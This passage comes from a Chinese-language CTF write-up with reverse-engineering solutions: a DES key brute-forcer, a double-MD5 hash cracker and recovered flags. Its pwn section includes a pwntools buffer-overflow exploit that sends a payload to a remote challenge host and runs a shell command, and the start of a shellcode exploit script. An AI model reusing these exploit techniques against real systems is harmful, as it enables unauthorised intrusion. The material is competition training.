*v0;</span><br><span class="line">                v4 = (<span class="type">unsigned</span> __int8)*v0 &gt;&gt; <span class="number">4</span>;</span><br><span class="line">                v5 = v4;</span><br><span class="line">                <span class="keyword">if</span> ( v4 &lt;= <span class="number">9u</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">LOBYTE</span>(v6) = v4 ^ <span class="number">0x30</span>;</span><br><span class="line">                    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">                        <span class="built_in">LOBYTE</span>(v6) = <span class="number">48</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    v6 = <span class="number">65</span>;</span><br><span class="line">                    <span class="keyword">do</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            v7 = v6 &amp; v5;</span><br><span class="line">                            v6 ^= v5;</span><br><span class="line">                            v5 = <span class="number">2</span> * v7;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">while</span> ( <span class="number">2</span> * v7 );</span><br><span class="line">                    v8 = <span class="number">-11</span>;</span><br><span class="line">                    v9 = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">do</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            v10 = v9;</span><br><span class="line">                            v11 = v8 &amp; v9;</span><br><span class="line">                            v12 = v8;</span><br><span class="line">                            v8 ^= v10;</span><br><span class="line">                            v9 = <span class="number">2</span> * v11;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">while</span> ( v9 );</span><br><span class="line">                    <span class="keyword">if</span> ( v10 != v12 )</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">do</span></span><br><span class="line">                            &#123;</span><br><span class="line">                                v13 = v6 &amp; v8;</span><br><span class="line">                                v6 ^= v8;</span><br><span class="line">                                v8 = <span class="number">2</span> * v13;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">while</span> ( <span class="number">2</span> * v13 );</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                *v1 = v6;</span><br><span class="line">                v1 += <span class="number">2</span>;</span><br><span class="line">                v14 = v3 &amp; <span class="number">0xF</span>;</span><br><span class="line">                v15 = v3 &amp; <span class="number">0xF</span>;</span><br><span class="line">                <span class="keyword">if</span> ( (v3 &amp; <span class="number">0xF</span>u) &gt; <span class="number">9</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                    v16 = <span class="number">65</span>;</span><br><span class="line">                    <span class="keyword">do</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            v18 = v16 &amp; v15;</span><br><span class="line">                            v16 ^= v15;</span><br><span class="line">                            v15 = <span class="number">2</span> * v18;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">while</span> ( <span class="number">2</span> * v18 );</span><br><span class="line">                    v19 = <span class="number">-11</span>;</span><br><span class="line">                    v20 = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">do</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            v21 = v20;</span><br><span class="line">                            v22 = v19 &amp; v20;</span><br><span class="line">                            v23 = v19;</span><br><span class="line">                            v19 ^= v21;</span><br><span class="line">                            v20 = <span class="number">2</span> * v22;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">while</span> ( v20 );</span><br><span class="line">                    <span class="keyword">if</span> ( v21 != v23 )</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">do</span></span><br><span class="line">                            &#123;</span><br><span class="line">                                v24 = v16;</span><br><span class="line">                                v16 ^= v19;</span><br><span class="line">                                v19 = <span class="number">2</span> * (v19 &amp; v24);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">while</span> ( v19 );</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">LOBYTE</span>(v16) = v14 ^ <span class="number">0x30</span>;</span><br><span class="line">                    <span class="keyword">if</span> ( !v14 )</span><br><span class="line">                        <span class="built_in">LOBYTE</span>(v16) = <span class="number">48</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                *(v1 - <span class="number">1</span>) = v16;</span><br><span class="line">                ++v0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( v1 != v2 );</span><br><span class="line">    &#125;</span><br><span class="line">    *v2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(Big_Numbers1_7FF798C250A0, Str2) )</span><br><span class="line">        <span class="built_in">sub_7FF798C116E0</span>(<span class="string">&quot;------\nGetFlag!\n------&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以知道程序先获取长度为6位的密钥和长度为40的flag，然后用自定义表base64编码密钥，接着DES加密<br>最后和Big_Numbers1_7FF798C250A0进行check<br>通过动调可知每次加密flag前都会在flag后带上不变的字符串88888888,且加密结果为1CA3C55D3A4D7BEA<br>据此可以通过爆破得到6位数字密钥key，然后用变表base64编码过的key去解Big_Numbers1_7FF798C250A0<br>还有一点就是Big_Numbers1_7FF798C250A0静态调试查看是混乱的动调可以获取到正确的<br>还有个小细节是动调的时候会检测输入的密钥是不是6位,flag有无DASCTF{}格式并且长度是否为40否则输入完会直接退出<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34882471/1693673526593-a71b62ce-42f8-4db8-94bd-f4ae5686a458.png#averageHue=%23c5f8f9&clientId=udf41f500-9b01-4&from=paste&height=105&id=u36834e68&originHeight=157&originWidth=1414&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=52729&status=done&style=none&taskId=u99bc5d2c-7866-40fd-86b2-eca50fc45df&title=&width=942.6666666666666" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_base64_encode</span>(<span class="params">data</span>):</span><br><span class="line">    custom_chars = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/&#x27;</span></span><br><span class="line">    <span class="comment"># 创建标准Base64字符集和自定义字符集的映射表</span></span><br><span class="line">    base64_chars = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    char_map = <span class="built_in">str</span>.maketrans(base64_chars, custom_chars)</span><br><span class="line">    <span class="comment"># 使用标准Base64编码</span></span><br><span class="line">    encoded_data = base64.b64encode(data.encode()).decode()</span><br><span class="line">    <span class="comment"># 替换为自定义字符</span></span><br><span class="line">    encoded_data = encoded_data.translate(char_map)</span><br><span class="line">    <span class="keyword">return</span> encoded_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_sequential_key</span>():</span><br><span class="line">    digits = <span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> key_tuple <span class="keyword">in</span> itertools.product(digits, repeat=<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">yield</span> <span class="string">&#x27;&#x27;</span>.join(key_tuple)</span><br><span class="line"></span><br><span class="line">enc = <span class="built_in">int</span>.to_bytes(<span class="number">0x1CA3C55D3A4D7BEA</span>, <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># print(enc)</span></span><br><span class="line">tmp = [<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>]</span><br><span class="line"><span class="keyword">for</span> psw <span class="keyword">in</span> generate_sequential_key():</span><br><span class="line">    key = custom_base64_encode(psw).encode()</span><br><span class="line">    <span class="comment">#DES加密</span></span><br><span class="line">    cipher = DES.new(key, DES.MODE_ECB)</span><br><span class="line">    cipher_text = cipher.encrypt(<span class="built_in">bytes</span>(tmp))</span><br><span class="line">    <span class="keyword">if</span> cipher_text.<span class="built_in">hex</span>() == enc:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Found key:<span class="subst">&#123;psw&#125;</span>\nIt&#x27;s base64_encode:<span class="subst">&#123;key.decode()&#125;</span>&quot;</span>)</span><br><span class="line">        encryption_key = key.decode()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">des_decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    <span class="comment"># 将密钥转换为8字节</span></span><br><span class="line">    key = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)[:<span class="number">8</span>]</span><br><span class="line">    <span class="comment"># 将16进制字符串转换为字节</span></span><br><span class="line">    ciphertext = binascii.unhexlify(ciphertext)</span><br><span class="line">    <span class="comment"># 创建DES加密器</span></span><br><span class="line">    cipher = DES.new(key, DES.MODE_ECB)</span><br><span class="line">    <span class="comment"># 解密数据</span></span><br><span class="line">    plaintext = cipher.decrypt(ciphertext)</span><br><span class="line">    <span class="keyword">return</span> plaintext.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># 要解密的数据和密钥</span></span><br><span class="line">encrypted_data = <span class="string">&quot;0723105D5C12217DCDC3601F5ECB54DA9CCEC2279F1684A13A0D716D17217F4C9EA85FF1A42795731CA3C55D3A4D7BEA&quot;</span></span><br><span class="line"><span class="comment"># encryption_key = &quot;mtuNndAM&quot;</span></span><br><span class="line"><span class="comment"># 解密数据</span></span><br><span class="line">decrypted_data = des_decrypt(encrypted_data, encryption_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted Data:&quot;</span>, decrypted_data)</span><br><span class="line"><span class="comment"># Found key:151490</span></span><br><span class="line"><span class="comment"># It&#x27;s base64_encode:mtuNndAM</span></span><br><span class="line"><span class="comment"># Decrypted Data: DASCTF&#123;f771b96b71514bb6bc20f3275fa9404e&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="Blast"><a href="#Blast" class="headerlink" title="Blast"></a>Blast</h2><p>ida Findcrypt插件看到MD5和好多个哈希值<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34882471/1693674403958-3da76ecd-177b-4176-96e6-d5ff44265a68.png#averageHue=%23f7f4f2&clientId=udf41f500-9b01-4&from=paste&height=655&id=u5ac76fac&originHeight=983&originWidth=1666&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=199609&status=done&style=none&taskId=u4135ccd2-2abb-43c9-b400-5f1e171f742&title=&width=1110.6666666666667" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34882471/1693674998490-bff934a2-3c7c-422d-b0e4-b768bf910191.png#averageHue=%23f7f6f2&clientId=udf41f500-9b01-4&from=paste&height=263&id=ufa2f2858&originHeight=394&originWidth=1140&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=89387&status=done&style=none&taskId=u275eca3e-e7b6-4140-b801-97f4fdd3014&title=&width=760" alt="image.png"><br>定位到MD5加密函数，查看引用有两个<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34882471/1693674472975-1a7f7221-ceca-4d52-adcb-ed57f8f6a51d.png#averageHue=%23f7f6f6&clientId=udf41f500-9b01-4&from=paste&height=175&id=u1cabd25b&originHeight=263&originWidth=1207&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=25524&status=done&style=none&taskId=u0a0bcf94-d9e9-43ba-9e9a-815105ac8d8&title=&width=804.6666666666666" alt="image.png"><br>一个在main函数一个在sub_402370,发现main函数和sub_402370差不多且在main函数中调用了sub_402370<br>所以直接盲猜两次哈希MD5(MD5(data))</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">enc = [</span><br><span class="line">  <span class="string">&#x27;14d89c38cd0fb23a14be2798d449c182&#x27;</span>,<span class="string">&#x27;a94837b18f8f43f29448b40a6e7386ba&#x27;</span>,<span class="string">&#x27;af85d512594fc84a5c65ec9970956ea5&#x27;</span>,<span class="string">&#x27;af85d512594fc84a5c65ec9970956ea5&#x27;</span>,<span class="string">&#x27;10e21da237a4a1491e769df6f4c3b419&#x27;</span>,<span class="string">&#x27;a705e8280082f93f07e3486636f3827a&#x27;</span>,<span class="string">&#x27;297e7ca127d2eef674c119331fe30dff&#x27;</span>,<span class="string">&#x27;b5d2099e49bdb07b8176dff5e23b3c14&#x27;</span>,<span class="string">&#x27;83be264eb452fcf0a1c322f2c7cbf987&#x27;</span>,<span class="string">&#x27;a94837b18f8f43f29448b40a6e7386ba&#x27;</span>,<span class="string">&#x27;71b0438bf46aa26928c7f5a371d619e1&#x27;</span>,<span class="string">&#x27;a705e8280082f93f07e3486636f3827a&#x27;</span>,<span class="string">&#x27;ac49073a7165f41c57eb2c1806a7092e&#x27;</span>,<span class="string">&#x27;a94837b18f8f43f29448b40a6e7386ba&#x27;</span>,<span class="string">&#x27;af85d512594fc84a5c65ec9970956ea5&#x27;</span>,<span class="string">&#x27;ed108f6919ebadc8e809f8b86ef40b05&#x27;</span>,<span class="string">&#x27;10e21da237a4a1491e769df6f4c3b419&#x27;</span>,<span class="string">&#x27;3cfd436919bc3107d68b912ee647f341&#x27;</span>,<span class="string">&#x27;a705e8280082f93f07e3486636f3827a&#x27;</span>,<span class="string">&#x27;65c162f7c43612ba1bdf4d0f2912bbc0&#x27;</span>,<span class="string">&#x27;10e21da237a4a1491e769df6f4c3b419&#x27;</span>,<span class="string">&#x27;a705e8280082f93f07e3486636f3827a&#x27;</span>,<span class="string">&#x27;3cfd436919bc3107d68b912ee647f341&#x27;</span>,<span class="string">&#x27;557460d317ae874c924e9be336a83cbe&#x27;</span>,<span class="string">&#x27;a705e8280082f93f07e3486636f3827a&#x27;</span>,<span class="string">&#x27;9203d8a26e241e63e4b35b3527440998&#x27;</span>,<span class="string">&#x27;10e21da237a4a1491e769df6f4c3b419&#x27;</span>,<span class="string">&#x27;f91b2663febba8a884487f7de5e1d249&#x27;</span>,<span class="string">&#x27;a705e8280082f93f07e3486636f3827a&#x27;</span>,<span class="string">&#x27;d7afde3e7059cd0a0fe09eec4b0008cd&#x27;</span>,<span class="string">&#x27;488c428cd4a8d916deee7c1613c8b2fd&#x27;</span>,<span class="string">&#x27;39abe4bca904bca5a11121955a2996bf&#x27;</span>,<span class="string">&#x27;a705e8280082f93f07e3486636f3827a&#x27;</span>,<span class="string">&#x27;3cfd436919bc3107d68b912ee647f341&#x27;</span>,<span class="string">&#x27;39abe4bca904bca5a11121955a2996bf&#x27;</span>,<span class="string">&#x27;4e44f1ac85cd60e3caa56bfd4afb675e&#x27;</span>,<span class="string">&#x27;45cf8ddfae1d78741d8f1c622689e4af&#x27;</span>,<span class="string">&#x27;3cfd436919bc3107d68b912ee647f341&#x27;</span>,<span class="string">&#x27;39abe4bca904bca5a11121955a2996bf&#x27;</span>,<span class="string">&#x27;4e44f1ac85cd60e3caa56bfd4afb675e&#x27;</span>,<span class="string">&#x27;37327bb06c83cb29cefde1963ea588aa&#x27;</span>,<span class="string">&#x27;a705e8280082f93f07e3486636f3827a&#x27;</span>,<span class="string">&#x27;23e65a679105b85c5dc7034fded4fb5f&#x27;</span>,<span class="string">&#x27;10e21da237a4a1491e769df6f4c3b419&#x27;</span>,<span class="string">&#x27;71b0438bf46aa26928c7f5a371d619e1&#x27;</span>,<span class="string">&#x27;af85d512594fc84a5c65ec9970956ea5&#x27;</span>,<span class="string">&#x27;39abe4bca904bca5a11121955a2996bf&#x27;</span>]</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成所有ASCII可见字符</span></span><br><span class="line">characters = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&#x27;</span></span><br><span class="line">combinations = itertools.product(characters, repeat=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 创建一个字典以存储已知哈希值和对应的原始字符</span></span><br><span class="line">hashes_dict = &#123;hash_val: <span class="literal">None</span> <span class="keyword">for</span> hash_val <span class="keyword">in</span> enc&#125;</span><br><span class="line"><span class="comment"># 遍历所有组合，计算哈希值并与已知的哈希值进行比较</span></span><br><span class="line"><span class="keyword">for</span> combo <span class="keyword">in</span> combinations:</span><br><span class="line">    plaintext = <span class="string">&#x27;&#x27;</span>.join(combo)</span><br><span class="line">    hash1 = hashlib.md5(plaintext.encode()).hexdigest()</span><br><span class="line">    hash2 = hashlib.md5(hash1.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> hash2 <span class="keyword">in</span> enc:</span><br><span class="line">        hashes_dict[hash2] = plaintext</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">  flag += hashes_dict[i]</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;Original Text for Hash &#x27;<span class="subst">&#123;i&#125;</span>&#x27;: <span class="subst">&#123;hashes_dict[i]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;14d89c38cd0fb23a14be2798d449c182&#x27;: H</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;a94837b18f8f43f29448b40a6e7386ba&#x27;: e</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;af85d512594fc84a5c65ec9970956ea5&#x27;: l</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;af85d512594fc84a5c65ec9970956ea5&#x27;: l</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;10e21da237a4a1491e769df6f4c3b419&#x27;: o</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;a705e8280082f93f07e3486636f3827a&#x27;: _</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;297e7ca127d2eef674c119331fe30dff&#x27;: C</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;b5d2099e49bdb07b8176dff5e23b3c14&#x27;: t</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;83be264eb452fcf0a1c322f2c7cbf987&#x27;: f</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;a94837b18f8f43f29448b40a6e7386ba&#x27;: e</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;71b0438bf46aa26928c7f5a371d619e1&#x27;: r</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;a705e8280082f93f07e3486636f3827a&#x27;: _</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;ac49073a7165f41c57eb2c1806a7092e&#x27;: V</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;a94837b18f8f43f29448b40a6e7386ba&#x27;: e</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;af85d512594fc84a5c65ec9970956ea5&#x27;: l</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;ed108f6919ebadc8e809f8b86ef40b05&#x27;: c</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;10e21da237a4a1491e769df6f4c3b419&#x27;: o</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;3cfd436919bc3107d68b912ee647f341&#x27;: m</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;a705e8280082f93f07e3486636f3827a&#x27;: _</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;65c162f7c43612ba1bdf4d0f2912bbc0&#x27;: T</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;10e21da237a4a1491e769df6f4c3b419&#x27;: o</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;a705e8280082f93f07e3486636f3827a&#x27;: _</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;3cfd436919bc3107d68b912ee647f341&#x27;: m</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;557460d317ae874c924e9be336a83cbe&#x27;: y</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;a705e8280082f93f07e3486636f3827a&#x27;: _</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;9203d8a26e241e63e4b35b3527440998&#x27;: M</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;10e21da237a4a1491e769df6f4c3b419&#x27;: o</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;f91b2663febba8a884487f7de5e1d249&#x27;: v</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;a705e8280082f93f07e3486636f3827a&#x27;: _</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;d7afde3e7059cd0a0fe09eec4b0008cd&#x27;: a</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;488c428cd4a8d916deee7c1613c8b2fd&#x27;: n</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;39abe4bca904bca5a11121955a2996bf&#x27;: d</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;a705e8280082f93f07e3486636f3827a&#x27;: _</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;3cfd436919bc3107d68b912ee647f341&#x27;: m</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;39abe4bca904bca5a11121955a2996bf&#x27;: d</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;4e44f1ac85cd60e3caa56bfd4afb675e&#x27;: 5</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;45cf8ddfae1d78741d8f1c622689e4af&#x27;: (</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;3cfd436919bc3107d68b912ee647f341&#x27;: m</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;39abe4bca904bca5a11121955a2996bf&#x27;: d</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;4e44f1ac85cd60e3caa56bfd4afb675e&#x27;: 5</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;37327bb06c83cb29cefde1963ea588aa&#x27;: )</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;a705e8280082f93f07e3486636f3827a&#x27;: _</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;23e65a679105b85c5dc7034fded4fb5f&#x27;: w</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;10e21da237a4a1491e769df6f4c3b419&#x27;: o</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;71b0438bf46aa26928c7f5a371d619e1&#x27;: r</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;af85d512594fc84a5c65ec9970956ea5&#x27;: l</span></span><br><span class="line"><span class="string">Original Text for Hash &#x27;39abe4bca904bca5a11121955a2996bf&#x27;: d</span></span><br><span class="line"><span class="string">Hello_Ctfer_Velcom_To_my_Mov_and_md5(md5)_world</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="risky-login"><a href="#risky-login" class="headerlink" title="risky_login"></a>risky_login</h2><p>考点：异架构pwn、risc-v用Ghidra才支持反汇编<br>exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line">p=remote(&#x27;tcp.cloud.dasctf.com&#x27;,29099)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(&#x27;berial&#x27;)</span><br><span class="line">payload=b&#x27;a&#x27;*（0xf8+8）+p64(0x123456ee)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(0.5)</span><br><span class="line">p.send(&#x27;cat fl*&#x27;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>考点：只有十六个字节的shellcode，得绕之后再写<br>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">c = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(c):</span><br><span class="line">        gdb.attach(p, c)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span 